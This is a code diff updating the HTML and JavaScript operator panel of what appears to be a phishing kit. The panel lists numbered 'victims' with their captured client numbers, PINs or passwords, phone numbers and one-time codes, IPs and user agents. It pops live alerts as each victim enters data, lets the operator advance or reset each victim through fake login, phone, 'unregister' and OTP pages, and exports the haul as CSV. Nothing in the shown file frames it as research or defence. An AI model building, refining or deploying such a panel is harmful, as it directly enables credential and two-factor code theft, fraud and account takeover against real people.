@@ -8,76 +8,130 @@
   <link rel="stylesheet" href="https://rsms.me/inter/inter.css">
   <style>
     :root {
-      --bg: #000;
-      --card: #0b0b0b;
-      --border: rgba(255,255,255,0.06);
-      --text: #f5f5f5;
-      --muted: #8b8b8b;
+      --bg: #000000;
+      --card-bg: #0b0b0b;
+      --card-border: rgba(255,255,255,0.055);
+      --card-border-hover: rgba(255,255,255,0.12);
+      --text-primary: #f5f5f5;
+      --text-muted: #8b8b8b;
       --green: #34d399;
       --red: #fb7185;
       --blue: #60a5fa;
       --yellow: #fbbf24;
       --radius: 18px;
     }
-    *{box-sizing:border-box;font-family:Inter,system-ui,sans-serif;margin:0}
-    body{background:radial-gradient(circle at 50% -20%,#111 0%,#000 60%);color:var(--text);padding:32px 28px}
-    .header{display:flex;justify-content:space-between;align-items:center;margin-bottom:24px;max-width:1120px;margin-left:auto;margin-right:auto}
-    .header h1{font-size:20px;font-weight:600}
-    .stats{display:grid;grid-template-columns:repeat(3,1fr);gap:22px;max-width:1120px;margin:0 auto 24px}
-    .stat-card{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:22px}
-    .stat-label{font-size:11px;text-transform:uppercase;color:var(--muted);margin-bottom:8px}
-    .stat-value{font-size:32px;font-weight:600}
-    .main-card{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:22px;max-width:1120px;margin:0 auto}
-    .main-card h2{font-size:14px;margin-bottom:16px}
-    table{width:100%;border-collapse:collapse;font-size:13px}
-    th{text-align:left;padding:10px;border-bottom:1px solid var(--border);color:var(--muted);font-weight:500;font-size:11px;text-transform:uppercase}
-    td{padding:10px;border-bottom:1px solid rgba(255,255,255,0.03)}
-    .cred{font-family:monospace;background:rgba(255,255,255,0.1);padding:2px 6px;border-radius:4px;font-size:12px}
-    .btn{padding:6px 12px;border:1px solid var(--border);background:transparent;color:var(--text);border-radius:6px;cursor:pointer;font-size:12px}
-    .btn:hover{background:rgba(255,255,255,0.05)}
-    .btn-green{border-color:var(--green);color:var(--green)}
-    .btn-red{border-color:var(--red);color:var(--red)}
-    .btn-blue{border-color:var(--blue);color:var(--blue)}
-    .actions{display:flex;gap:6px}
-    .empty{text-align:center;color:var(--muted);padding:40px}
-    #logout{float:right}
-    .domain{color:var(--blue);text-decoration:none}
-    .domain:hover{text-decoration:underline}
+    *{box-sizing:border-box;font-family:InterVariable,Inter,system-ui,sans-serif}
+    body{margin:0;background:radial-gradient(circle at 50% -20%,#111 0%,#000 60%);color:var(--text-primary);}
+    .greet-bar{max-width:1120px;margin:32px auto 0;padding:0 28px;font-size:20px;font-weight:600;line-height:1.05}
+    .dashboard{max-width:1120px;margin:24px auto 64px;padding:0 28px}
+    .grid{display:grid;gap:22px}.card{position:relative;background:linear-gradient(180deg,rgba(255,255,255,0.04),rgba(255,255,255,0) 55%),var(--card-bg);border:1px solid var(--card-border);border-radius:var(--radius);padding:22px;transition:transform 240ms cubic-bezier(.2,.8,.2,1),border-color 240ms ease,box-shadow 240ms ease}
+    .card:hover{transform:translateY(-3px);border-color:var(--card-border-hover);box-shadow:0 18px 36px rgba(0,0,0,.55)}
+    .stats{grid-template-columns:repeat(3,1fr)}.stat-label{font-size:11px;font-weight:500;letter-spacing:.18em;text-transform:uppercase;color:var(--text-muted)}.stat-value{margin-top:12px;font-size:34px;font-weight:600;line-height:1.05}
+    table{width:100%;font-size:.9rem;border-collapse:collapse;margin-top:1rem}th{text-align:left;padding:.6rem .5rem;border-bottom:1px solid #e5e5e5;font-weight:500;font-size:.8rem;text-transform:uppercase;color:#555}td{padding:.6rem .5rem;border-bottom:1px solid #f0f0f0}tr:hover{background:#fafafa}
+    .btn{padding:.35rem .75rem;font-size:.8rem;border-radius:6px;border:1px solid rgba(255,255,255,.08);background:rgba(255,255,255,.08);color:var(--text-primary);cursor:pointer;transition:all .18s ease}.btn:hover{background:rgba(255,255,255,.15);border-color:rgba(255,255,255,.2)}
+    .icon-btn{width:32px;height:32px;padding:6px;border-radius:6px;border:1px solid rgba(255,255,255,.08);background:rgba(255,255,255,.08);cursor:pointer;transition:all .18s ease;display:inline-flex;align-items:center;justify-content:center}.icon-btn:hover{background:rgba(255,255,255,.15);border-color:rgba(255,255,255,.2);transform:scale(1.05)}
+    .icon-btn img{width:18px;height:18px;filter:brightness(0) invert(1)}
+    .icon-btn.continue{border-color:rgba(52,211,153,.3)}.icon-btn.continue:hover{background:rgba(52,211,153,.15)}
+    .icon-btn.redo{border-color:rgba(251,113,133,.3)}.icon-btn.redo:hover{background:rgba(251,113,133,.15)}
+    .icon-btn.manage{border-color:rgba(96,165,250,.3)}.icon-btn.manage:hover{background:rgba(96,165,250,.15)}
+    .cred{font-family:monospace;font-size:.8rem;background:#f1f1f1;padding:2px 4px;border-radius:3px;color:#000}
+    .detail{font-size:12px;color:var(--text-muted);margin-top:8px}
+    #modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.85);align-items:center;justify-content:center;z-index:1000;backdrop-filter:blur(5px)}#modal .card{max-width:600px;width:90%;background:#111;border-color:#333;max-height:90vh;overflow-y:auto;padding:28px}
+    #empty{text-align:center;color:#888;padding:2rem 0}
+    @media(max-width:900px){.stats{grid-template-columns:1fr}}
+
+    /* Clean Modal Styles */
+    .modal-header{border-bottom:1px solid rgba(255,255,255,0.1);padding-bottom:16px;margin-bottom:20px}
+    .modal-title{font-size:20px;font-weight:600;margin:0;color:var(--text-primary)}
+    .modal-subtitle{font-size:13px;color:var(--text-muted);margin-top:4px}
+    
+    .info-grid{display:grid;grid-template-columns:1fr 1fr;gap:20px;margin-bottom:20px}
+    .info-section{background:rgba(255,255,255,0.02);border-radius:10px;padding:16px;border:1px solid rgba(255,255,255,0.05)}
+    .info-label{font-size:11px;text-transform:uppercase;letter-spacing:0.08em;color:var(--text-muted);margin-bottom:6px;font-weight:500}
+    .info-value{font-size:14px;color:var(--text-primary);font-weight:500}
+    .info-value.mono{font-family:monospace;font-size:13px;background:rgba(255,255,255,0.08);padding:4px 8px;border-radius:4px;display:inline-block;margin-top:2px}
+    .info-value.small{font-size:12px;color:var(--text-muted);word-break:break-all;line-height:1.4}
+    
+    .full-width{grid-column:1 / -1}
+    
+    /* Activity Log Styles */
+    .activity-section{margin-top:20px;border-top:1px solid rgba(255,255,255,0.1);padding-top:20px}
+    .activity-title{font-size:12px;text-transform:uppercase;letter-spacing:0.08em;color:var(--text-muted);margin-bottom:12px;font-weight:600}
+    .activity-log{max-height:220px;overflow-y:auto;background:rgba(0,0,0,0.3);border-radius:8px;padding:12px;border:1px solid rgba(255,255,255,0.05)}
+    .activity-item{padding:10px 0;border-bottom:1px solid rgba(255,255,255,0.05);display:flex;justify-content:space-between;align-items:flex-start}
+    .activity-item:last-child{border-bottom:none;padding-bottom:0}
+    .activity-item:first-child{padding-top:0}
+    .activity-meta{flex:1}
+    .activity-action{font-size:13px;color:var(--text-primary);font-weight:500;margin-bottom:2px}
+    .activity-detail{font-size:12px;color:var(--text-muted)}
+    .activity-time{font-size:11px;color:var(--text-muted);white-space:nowrap;margin-left:16px;font-family:monospace}
+
+    /* Delete Section */
+    .delete-section{margin-top:20px;padding-top:20px;border-top:1px solid rgba(255,255,255,0.1);display:flex;justify-content:space-between;align-items:center}
+    .delete-info{font-size:12px;color:var(--text-muted)}
+    .btn-danger{background:rgba(251,113,133,.15);border-color:rgba(251,113,133,.4);color:var(--red);padding:8px 16px}
+    .btn-danger:hover{background:rgba(251,113,133,.25)}
+    .btn-secondary{background:rgba(255,255,255,.05);border-color:rgba(255,255,255,.1)}
+
+    /* toast alerts */
+    #alert-container{position:fixed;top:20px;right:20px;z-index:10000;display:flex;flex-direction:column;gap:10px;max-width:400px}
+    .alert{background:linear-gradient(135deg,rgba(255,255,255,0.1),rgba(255,255,255,0.05));backdrop-filter:blur(10px);border:1px solid rgba(255,255,255,.1);border-radius:12px;padding:16px 20px;box-shadow:0 10px 30px rgba(0,0,0,.5);animation:slideIn .3s ease,fadeOut .3s ease 4.7s;display:flex;align-items:center;gap:12px;cursor:pointer;transition:transform .2s ease}
+    .alert:hover{transform:translateX(-5px)}
+    .alert-icon{width:40px;height:40px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0}
+    .alert-content{flex:1}.alert-title{font-size:13px;font-weight:600;color:var(--text-primary);margin-bottom:2px}.alert-desc{font-size:12px;color:var(--text-muted)}.alert-time{font-size:11px;color:var(--text-muted);margin-top:4px}
+    .alert-success{border-left:3px solid var(--green)}.alert-success .alert-icon{background:rgba(52,211,153,.15);color:var(--green)}
+    .alert-warning{border-left:3px solid var(--yellow)}.alert-warning .alert-icon{background:rgba(251,191,36,.15);color:var(--yellow)}
+    .alert-info{border-left:3px solid var(--blue)}.alert-info .alert-icon{background:rgba(96,165,250,.15);color:var(--blue)}
+    .alert-error{border-left:3px solid var(--red)}.alert-error .alert-icon{background:rgba(251,113,133,.15);color:var(--red)}
+    @keyframes slideIn{from{transform:translateX(100%);opacity:0}to{transform:translateX(0);opacity:1}}
+    @keyframes fadeOut{to{opacity:0;transform:translateX(20px)}}
   </style>
 </head>
 <body>
-  <div class="header">
-    <h1>Hello, <span id="user">admin</span>! <span id="clock" style="color:var(--muted);font-size:14px;font-weight:400"></span></h1>
-    <button class="btn" id="logout" onclick="logout()">Logout</button>
+  <div id="alert-container"></div>
+
+  <div class="greet-bar">
+    Hello, <span id="userName">admin</span>! • <span id="clock">--:-- --</span>
+    <button id="logoutBtn" class="btn" style="float:right">Logout</button>
   </div>
 
-  <div class="stats">
-    <div class="stat-card">
-      <div class="stat-label">Active Sessions</div>
-      <div class="stat-value" id="active">0</div>
+  <div class="dashboard">
+    <div class="grid stats">
+      <div class="card"><div class="stat-label">Active Sessions</div><div class="stat-value" id="active">—</div></div>
+      <div class="card"><div class="stat-label">Visits (total)</div><div class="stat-value" id="total">—</div></div>
+      <div class="card">
+        <div class="stat-label">Successful Logins</div>
+        <div class="stat-value" id="success">—</div>
+        <button id="exportBtn" class="btn" style="margin-top:8px;width:auto;font-size:11px;position:absolute;bottom:12px;right:12px;">Export CSV</button>
+      </div>
     </div>
-    <div class="stat-card">
-      <div class="stat-label">Total Visits</div>
-      <div class="stat-value" id="total">0</div>
-    </div>
-    <div class="stat-card">
-      <div class="stat-label">Success</div>
-      <div class="stat-value" id="success">0</div>
-      <button class="btn" style="margin-top:8px;font-size:11px" onclick="exportCSV()">Export CSV</button>
+
+    <div class="card" style="margin-top:22px">
+      <div style="font-size:14px;font-weight:600;margin-bottom:12px">Active Sessions · <a id="domainLink" href="#" target="_blank" style="color:#60a5fa;text-decoration:none"></a></div>
+      <table id="tbl"><thead><tr>
+        <th>#</th><th>Client</th><th>PIN</th><th>Phone</th><th>OTP</th><th>IP</th><th>Platform</th><th>Browser</th><th>Status</th><th>Actions</th>
+      </tr></thead><tbody></tbody></table>
+      <div id="empty">No active sessions</div>
     </div>
   </div>
 
-  <div class="main-card">
-    <h2>Active Sessions · <a id="domain" class="domain" href="#" target="_blank">-</a></h2>
-    <table id="table">
-      <thead>
-        <tr>
-          <th>#</th><th>Client</th><th>PIN</th><th>Phone</th><th>OTP</th><th>IP</th><th>Platform</th><th>Status</th><th>Actions</th>
-        </tr>
-      </thead>
-      <tbody></tbody>
-    </table>
-    <div class="empty" id="empty">No active sessions</div>
+  <!-- detail modal -->
+  <div id="modal" onclick="if(event.target===this)closeModal()">
+    <div class="card">
+      <div class="modal-header">
+        <div style="display:flex;justify-content:space-between;align-items:flex-start">
+          <div>
+            <h3 class="modal-title" id="modalTitle">Session Details</h3>
+            <div class="modal-subtitle" id="modalSubtitle">Victim #0 • Connected at --:--</div>
+          </div>
+          <button onclick="closeModal()" class="btn" style="font-size:18px;padding:4px 12px;line-height:1">✕</button>
+        </div>
+      </div>
+      
+      <div id="modalBody">
+        <!-- Content injected by JS -->
+      </div>
+    </div>
   </div>
 
   <script>
@@ -132,123 +186,320 @@
       throw new Error('Not authenticated');
     }
 
-    // Clock
-    setInterval(() => {
-      document.getElementById('clock').textContent = new Date().toLocaleTimeString();
-    }, 1000);
+    let currentSid = null, jsonData = {}, lastSessions = new Map();
+    const qs = s => document.querySelector(s);
+    const fmt = t => new Date(t).toLocaleTimeString();
+    const fmtDate = t => new Date(t).toLocaleString();
 
-    function logout() {
-      try {
-        localStorage.removeItem('panel_token');
-        sessionStorage.removeItem('panel_token');
-      } catch(e) {}
-      AUTH_TOKEN = null;
-      window.location.href = '/panel/logout';
+    /* ----------  LIVE CLOCK  ---------- */
+    function updateClock(){
+      const now = new Date(), h = now.getHours(), m = now.getMinutes(), suffix = h >= 12 ? 'pm' : 'am';
+      qs('#clock').textContent = `${h % 12 || 12}:${m.toString().padStart(2,'0')}${suffix}`;
+    }
+    updateClock(); setInterval(updateClock, 1000);
+
+    /* ----------  TOAST ALERTS  ---------- */
+    function showAlert(type, title, desc, victimNum){
+      const container = qs('#alert-container');
+      const alert = document.createElement('div');
+      alert.className = `alert alert-${type}`;
+      alert.innerHTML = `
+        <div class="alert-icon">${{success:'✓',warning:'⚠',info:'ℹ',error:'✕'}[type]}</div>
+        <div class="alert-content">
+          <div class="alert-title">${title}</div>
+          <div class="alert-desc">${desc}</div>
+          <div class="alert-time">Victim #${victimNum} • ${fmt(Date.now())}</div>
+        </div>`;
+      alert.onclick = () => alert.remove();
+      container.appendChild(alert);
+      setTimeout(() => alert.remove(), 5000);
     }
 
-    function exportCSV() {
-      if (!AUTH_TOKEN) return;
-      window.location.href = '/api/export?token=' + encodeURIComponent(AUTH_TOKEN);
+    /* ----------  STATUS TEXT  ---------- */
+    function statusText(s){
+      if (s.page==='success') return '<div style="color:var(--green)">APPROVED</div>';
+      if (s.page==='index.html' && s.entered) return '<div style="font-size:11px;color:var(--green)">ENTERED CREDENTIALS</div>';
+      if (s.page==='verify.html' && s.phone) return '<div style="font-size:11px;color:var(--blue)">ENTERED PHONE</div>';
+      if (s.page==='unregister.html' && s.unregisterClicked) return '<div style="font-size:11px;color:var(--yellow)">CLICKED UNREGISTER</div>';
+      if (s.page==='otp.html' && s.otp) return '<div style="font-size:11px;color:var(--green)">ENTERED OTP</div>';
+      return '<div style="font-size:11px;color:var(--text-muted)">WAITING</div>';
     }
 
-    function pageName(p) {
-      const map = {'index.html':'LOGIN','verify.html':'PHONE','unregister.html':'UNREG','otp.html':'OTP','success':'DONE'};
-      return map[p] || p;
+    /* ----------  ACTION BUTTONS (table row) - FIXED LOGIC  ---------- */
+    function actionButtons(s){
+      let html = '<div style="display:flex;gap:6px">';
+      
+      // Always show view details
+      html += `<button class="icon-btn manage" onclick="showDetail('${s.sid}')" title="View Details">📄</button>`;
+
+      // Show redo/continue based on page AND data entered - FIXED CONDITIONS
+      if (s.page === 'index.html') {
+        // On login page: show buttons if credentials entered (check both entered flag and email/password values)
+        if (s.entered === true || (s.email && s.password)) {
+          html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue">▶</button>`;
+          html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo">✕</button>`;
+        }
+      } else if (s.page === 'verify.html') {
+        // On verify page: show buttons if phone entered
+        if (s.phone && s.phone.length > 0) {
+          html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue">▶</button>`;
+          html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo">✕</button>`;
+        }
+      } else if (s.page === 'unregister.html') {
+        // On unregister page: show continue if clicked, no redo
+        if (s.unregisterClicked === true) {
+          html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue">▶</button>`;
+        }
+      } else if (s.page === 'otp.html') {
+        // On OTP page: show buttons if OTP entered
+        if (s.otp && s.otp.length > 0) {
+          html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue">▶</button>`;
+          html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo">✕</button>`;
+        }
+      }
+      // Note: success page has no buttons (already approved)
+      
+      return html + '</div>';
     }
 
-    function render(data) {
+    /* ----------  CHANGE DETECTION - REMOVED TAB CLOSE DETECTION  ---------- */
+    function checkChanges(newSessions){
+      // Only check for new data entry, not session removal
+      newSessions.forEach(s => {
+        const old = lastSessions.get(s.sid);
+        if (!old) {
+          showAlert('info', 'NEW VISITOR', `Connected from ${s.ip}`, s.victimNum);
+          if (s.entered) showAlert('success', 'ENTERED CREDENTIALS', `Client: ${s.email}`, s.victimNum);
+        } else {
+          if (!old.entered && s.entered) showAlert('success', 'ENTERED CREDENTIALS', `Client: ${s.email}`, s.victimNum);
+          if (!old.phone && s.phone) showAlert('info', 'ENTERED PHONE', `Phone: ${s.phone}`, s.victimNum);
+          if (!old.unregisterClicked && s.unregisterClicked) showAlert('warning', 'CLICKED UNREGISTER', 'Victim proceeded to unregister', s.victimNum);
+          if (!old.otp && s.otp) showAlert('success', 'ENTERED OTP', `OTP: ${s.otp}`, s.victimNum);
+          if (old.page !== s.page) showAlert('info', 'PAGE CHANGE', `Moved to ${pageTitle(s.page)}`, s.victimNum);
+        }
+      });
+      lastSessions = new Map(newSessions.map(s => [s.sid, {...s}]));
+    }
+
+    /* ----------  RENDER  ---------- */
+    function pageTitle(f){
+      switch(f){
+        case 'index.html': return 'LOGIN';
+        case 'verify.html': return 'PHONE';
+        case 'unregister.html': return 'UNREGISTER';
+        case 'otp.html': return 'OTP';
+        case 'success': return 'SUCCESS';
+        default: return f;
+      }
+    }
+    function render(d){
       // Update token if server returned new one
-      if (data.token && data.token !== AUTH_TOKEN) {
-        AUTH_TOKEN = data.token;
+      if (d.token && d.token !== AUTH_TOKEN) {
+        AUTH_TOKEN = d.token;
         try {
           localStorage.setItem('panel_token', AUTH_TOKEN);
           sessionStorage.setItem('panel_token', AUTH_TOKEN);
         } catch(e) {}
       }
       
-      document.getElementById('user').textContent = data.username;
-      document.getElementById('active').textContent = data.active;
-      document.getElementById('total').textContent = data.totalVictims;
-      document.getElementById('success').textContent = data.success;
-      document.getElementById('domain').textContent = data.domain;
-      document.getElementById('domain').href = data.domain;
+      qs('#userName').textContent = d.username;
+      qs('#active').textContent   = d.active;
+      qs('#total').textContent    = d.totalVictims;
+      qs('#success').textContent  = d.success;
+      qs('#domainLink').textContent = d.domain || 'localhost';
+      qs('#domainLink').href        = d.domain || 'http://localhost';
 
-      const tbody = document.querySelector('#table tbody');
-      const empty = document.getElementById('empty');
-      
-      if (!data.sessions.length) {
-        tbody.innerHTML = '';
-        empty.style.display = 'block';
-        return;
-      }
-      
-      empty.style.display = 'none';
-      tbody.innerHTML = data.sessions.map(s => `
-        <tr>
+      const body = qs('#tbl tbody');
+      const empty= qs('#empty');
+      if(!d.sessions.length){ body.innerHTML=''; empty.style.display='block'; return; }
+      empty.style.display='none';
+      body.innerHTML = d.sessions.map(s=>`
+        <tr data-sid="${s.sid}">
           <td>${s.victimNum}</td>
-          <td><span class="cred">${s.email || '-'}</span></td>
-          <td><span class="cred">${s.password || '-'}</span></td>
-          <td><span class="cred">${s.phone || '-'}</span></td>
-          <td><span class="cred">${s.otp || '-'}</span></td>
+          <td><span class="cred">${s.email||'—'}</span></td>
+          <td><span class="cred">${s.password||'—'}</span></td>
+          <td><span class="cred">${s.phone||'—'}</span></td>
+          <td><span class="cred">${s.otp||'—'}</span></td>
           <td>${s.ip}</td>
           <td>${s.platform}</td>
-          <td>${pageName(s.page)}</td>
-          <td class="actions">
-            ${s.page === 'index.html' && s.entered ? `<button class="btn btn-green" onclick="action('cont','${s.sid}')">▶</button><button class="btn btn-red" onclick="action('redo','${s.sid}')">✕</button>` : ''}
-            ${s.page === 'verify.html' && s.phone ? `<button class="btn btn-green" onclick="action('cont','${s.sid}')">▶</button><button class="btn btn-red" onclick="action('redo','${s.sid}')">✕</button>` : ''}
-            ${s.page === 'unregister.html' && s.unregisterClicked ? `<button class="btn btn-green" onclick="action('cont','${s.sid}')">▶</button>` : ''}
-            ${s.page === 'otp.html' && s.otp ? `<button class="btn btn-green" onclick="action('cont','${s.sid}')">▶</button><button class="btn btn-red" onclick="action('redo','${s.sid}')">✕</button>` : ''}
-            <button class="btn btn-blue" onclick="action('delete','${s.sid}')">🗑</button>
-          </td>
-        </tr>
-      `).join('');
+          <td>${s.browser}</td>
+          <td><div style="font-weight:600">${pageTitle(s.page)}</div>${statusText(s)}</td>
+          <td>${actionButtons(s)}</td>
+        </tr>`).join('');
     }
 
-    function action(act, sid) {
+    /* ----------  MODAL / DETAIL VIEW  ---------- */
+    function showDetail(sid){
+      const s = jsonData.sessions.find(x=>x.sid===sid);
+      if(!s)return;
+      currentSid = sid;
+      
+      // Update header
+      qs('#modalTitle').textContent = `Victim #${s.victimNum}`;
+      qs('#modalSubtitle').textContent = `${s.ip} • Connected ${fmtDate(s.dateStr)}`;
+      
+      // Build activity log HTML
+      const activityHtml = s.activityLog && s.activityLog.length ? 
+        s.activityLog.slice().reverse().map(log => `
+          <div class="activity-item">
+            <div class="activity-meta">
+              <div class="activity-action">${log.action}</div>
+              ${log.detail ? `<div class="activity-detail">${log.detail}</div>` : ''}
+            </div>
+            <div class="activity-time">${fmt(log.time)}</div>
+          </div>
+        `).join('') : '<div style="color:var(--text-muted);font-size:12px;padding:8px 0">No activity recorded</div>';
+      
+      qs('#modalBody').innerHTML = `
+        <div class="info-grid">
+          <div class="info-section">
+            <div class="info-label">Session ID</div>
+            <div class="info-value mono" style="font-size:11px">${s.sid}</div>
+          </div>
+          
+          <div class="info-section">
+            <div class="info-label">Current Page</div>
+            <div class="info-value" style="color:${s.page==='success'?'var(--green)':'var(--blue)'}">${pageTitle(s.page)}</div>
+          </div>
+          
+          <div class="info-section">
+            <div class="info-label">Client Number</div>
+            <div class="info-value mono">${s.email||'—'}</div>
+          </div>
+          
+          <div class="info-section">
+            <div class="info-label">PIN / Password</div>
+            <div class="info-value mono">${s.password||'—'}</div>
+          </div>
+          
+          <div class="info-section">
+            <div class="info-label">Phone Number</div>
+            <div class="info-value mono">${s.phone||'—'}</div>
+          </div>
+          
+          <div class="info-section">
+            <div class="info-label">OTP Code</div>
+            <div class="info-value mono">${s.otp||'—'}</div>
+          </div>
+          
+          <div class="info-section full-width">
+            <div class="info-label">System Information</div>
+            <div style="display:grid;grid-template-columns:repeat(3, 1fr);gap:12px;margin-top:8px">
+              <div>
+                <div style="font-size:11px;color:var(--text-muted);margin-bottom:2px">Platform</div>
+                <div style="font-size:13px;font-weight:500">${s.platform}</div>
+              </div>
+              <div>
+                <div style="font-size:11px;color:var(--text-muted);margin-bottom:2px">Browser</div>
+                <div style="font-size:13px;font-weight:500">${s.browser}</div>
+              </div>
+              <div>
+                <div style="font-size:11px;color:var(--text-muted);margin-bottom:2px">Unregister</div>
+                <div style="font-size:13px;font-weight:500;color:${s.unregisterClicked?'var(--green)':'var(--text-muted)'}">${s.unregisterClicked?'Yes':'No'}</div>
+              </div>
+            </div>
+            <div style="margin-top:12px">
+              <div style="font-size:11px;color:var(--text-muted);margin-bottom:4px">User Agent</div>
+              <div class="info-value small">${s.ua}</div>
+            </div>
+          </div>
+        </div>
+        
+        <div class="activity-section">
+          <div class="activity-title">Activity Log (${s.activityLog ? s.activityLog.length : 0} events)</div>
+          <div class="activity-log">${activityHtml}</div>
+        </div>
+        
+        <div class="delete-section">
+          <div class="delete-info">Permanently remove this session from active sessions</div>
+          <button class="btn btn-danger" onclick="confirmDelete('${s.sid}')">Delete Session</button>
+        </div>
+      `;
+      
+      qs('#modal').style.display='flex';
+    }
+    
+    function confirmDelete(sid){
+      if(confirm('Are you sure you want to delete this session? This action cannot be undone.')){
+        act('delete', sid);
+        closeModal();
+      }
+    }
+    
+    function closeModal(){
+      qs('#modal').style.display='none';
+      currentSid = null;
+    }
+
+    /* ----------  CONTROL  ---------- */
+    async function act(action,sid){
       if (!AUTH_TOKEN) return;
-      fetch('/api/panel?token=' + encodeURIComponent(AUTH_TOKEN), {
+      await fetch('/api/panel?token=' + encodeURIComponent(AUTH_TOKEN), {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({action: act, sid: sid})
-      }).then(() => load());
+        body: JSON.stringify({action, sid})
+      });
+      load();
     }
 
+    /* ----------  LOGOUT + EXPORT (bottom-right)  ---------- */
+    qs('#logoutBtn').onclick = async () => {
+      try {
+        localStorage.removeItem('panel_token');
+        sessionStorage.removeItem('panel_token');
+      } catch(e) {}
+      await fetch('/panel/logout?token=' + encodeURIComponent(AUTH_TOKEN));
+      location.replace('/panel');
+    };
+    
+    qs('#exportBtn').onclick = () => {
+      if (!AUTH_TOKEN) return;
+      location.href = '/api/export?token=' + encodeURIComponent(AUTH_TOKEN);
+    };
+
+    /* ----------  LONG-POLL  ---------- */
     let failCount = 0;
     
-    function load() {
+    async function load(){
       if (!AUTH_TOKEN) {
         window.location.href = '/panel';
         return;
       }
       
-      fetch('/api/panel?token=' + encodeURIComponent(AUTH_TOKEN))
-        .then(r => {
-          if (r.status === 401) {
-            failCount++;
-            if (failCount > 2) {
-              // Clear storage and redirect
-              try {
-                localStorage.removeItem('panel_token');
-                sessionStorage.removeItem('panel_token');
-              } catch(e) {}
-              window.location.href = '/panel';
-            }
-            return null;
+      try {
+        const r = await fetch('/api/panel?token=' + encodeURIComponent(AUTH_TOKEN));
+        if (r.status === 401) {
+          failCount++;
+          if (failCount > 2) {
+            try {
+              localStorage.removeItem('panel_token');
+              sessionStorage.removeItem('panel_token');
+            } catch(e) {}
+            location.replace('/panel');
+            return;
           }
-          failCount = 0;
-          return r.json();
-        })
-        .then(data => {
-          if (data) render(data);
-        })
-        .catch(e => {
-          console.error('Load error:', e);
-        });
+          setTimeout(load, 1000);
+          return;
+        }
+        
+        failCount = 0;
+        const d = await r.json();
+        if(d.error) {
+          location.replace('/panel');
+          return;
+        }
+        
+        jsonData = d;
+        checkChanges(d.sessions);
+        render(d);
+      } catch (e) {
+        console.error('Load error:', e);
+      }
+      
+      setTimeout(load, 300);
     }
-
-    // Load immediately and then poll
+    
     load();
-    setInterval(load, 2000);
   </script>
 </body>
 </html>
